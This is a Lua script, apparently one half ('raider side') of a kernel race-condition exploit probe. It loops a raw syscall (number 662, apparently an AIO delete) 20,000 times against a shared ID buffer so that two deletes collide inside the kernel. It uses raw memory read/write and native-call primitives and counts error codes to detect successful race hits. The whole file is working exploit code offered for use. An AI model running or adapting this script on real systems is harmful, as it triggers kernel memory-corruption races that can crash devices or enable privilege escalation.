-- CRASH_CLASS: HIGH
-- PROBE 899b: raider side. Reads the published id buffer from the creator's Lua state
-- (same process, shared address space) and deletes it continuously so the two deletes
-- collide inside the kernel.
print("=== PROBE 899b: aio race, raider ===")
local function to_num(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local IDBUF=__IDBUF__
print(string.format("[0] pid=%s idbuf=%X",tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))),IDBUF))
local er=memory.alloc(32)
local n0,n1,n2,n3,hit=0,0,0,0,0
for i=1,20000 do
  zero(er,32)
  local o,r=pcall(function() return mk(662)(uint64(IDBUF),uint64(4),uint64(er)) end)
  if o then
    local e0=rd(er) or 0
    if e0==0 then hit=hit+1
    elseif e0==0x80020003 then n3=n3+1
    elseif e0==0x80020010 then n1=n1+1
    else n2=n2+1 end
    local e1=rd(er+4) or 0
    if e1==0 then hit=hit+1 end
  end
end
print(string.format("[1] loops done zero=%d esrch=%d inflight=%d other=%d",hit,n3,n1,n2))
print("[Z] alive pid="..tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
